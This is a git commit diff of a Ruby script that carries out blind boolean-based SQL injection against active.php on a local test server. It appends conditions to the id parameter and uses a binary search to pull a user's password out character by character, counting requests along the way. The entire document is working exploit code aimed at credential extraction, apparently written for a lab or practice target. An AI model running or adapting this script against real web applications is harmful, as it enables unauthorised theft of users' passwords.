569df883e45d7922922a193d0d65874946436650
Nicolas Maitre <nicolas.johan.maitre@gmail.com>
2020-09-16 15:47:17 +0200

    binary search optimisation

--- main.rb
+++ main.rb
@@ -2,12 +2,10 @@ require 'open-uri'
 require 'pp'
 require_relative './uri_encode_component'
 
-
 USER_ID = ARGV[0] || 1
 
-def guess_val max
-    current_max = max
-    current_min = 0
+def guess_val max = nil
+    current_min, current_max = fast_min_max_val(max){|val| yield val}
     loop do
         max_to_compare = (current_max - current_min)/2 + current_min
         is_smaller_than = yield max_to_compare
@@ -21,44 +19,48 @@ def guess_val max
     current_min
 end
 
+def fast_min_max_val max = nil
+    current_max = 1
+    current_min = 0
+    loop do
+        break if max && current_max >= max
+        break if yield current_max
+        current_min = current_max
+        current_max*=2
+    end
+    return current_min, current_max
+end
 @request_count = 0
 
-def request_val id_sql_val
+def request_val condition
     @request_count+=1;
     # puts 'sql req: ' + id_sql_val
-    res = URI.open("http://localhost:1234/active.php?id=#{encodeURIComponent(id_sql_val)}").read
+    res = URI.open("http://localhost:1234/active.php?id=#{USER_ID} AND #{encodeURIComponent(condition)}").read
     return nil if res.include? 'error'
     (res.include? 'is active') || (res.include? 'suspended')
 end
 
 #code:
-mdp_length = guess_val(50){ |comp|
-    request_val "#{USER_ID} AND length(password) < #{comp}" 
-}
-puts "mdp_length: #{mdp_length}"
+# mdp_length = guess_val{ |comp|
+#     request_val "CHAR_LENGTH(password) < #{comp}" 
+# }
+# puts "mdp_length: #{mdp_length}"
 
-SQL_ESCAPE_CHARS = '%_$\''
+# SQL_ESCAPE_CHARS = '%_$\''
+SQL_ESCAPE_CHARS = '\\\''
 current_password = ""
-mdp_length.times do |index|
-    break if current_password.bytesize >= mdp_length
-    (0..).each do |char_ind|
-        char = char_ind.chr(Encoding::UTF_8)
+loop do
+    #v2 mais pas le temps
+    char_index = guess_val do |char_comp|
+        char = char_comp.chr(Encoding::UTF_8)
         escaped_char = (SQL_ESCAPE_CHARS.include? char)?('\\' + char) : char
-        #visual progression
-        print "\r#{current_password}#{char.sub(/[^[:print:]]/, ' ')}";
-
-        if request_val "#{USER_ID} AND password LIKE BINARY '#{current_password}#{escaped_char}%'"
-            current_password = current_password + char
-            break
-        end
+        print "\r#{current_password}#{char.sub(/[^[:print:]]/, ' ')}"; #visual
+        request_val "password < BINARY '#{current_password}#{escaped_char}'"
     end
+    break if char_index == 0
+    current_password += char_index.chr(Encoding::UTF_8)
 end
+
 puts
 puts "password: #{current_password}";
 puts "with #{@request_count} requests";
-
-# BINARY WAY THAT DOESN'T WORK AT ALL
-# password_binary_number = guess_val(mdp_length * 32){ |comp|
-#     request_val "3 AND BINARY password < BINARY #{comp}"
-# }
-# puts "password number #{password_binary_number}"
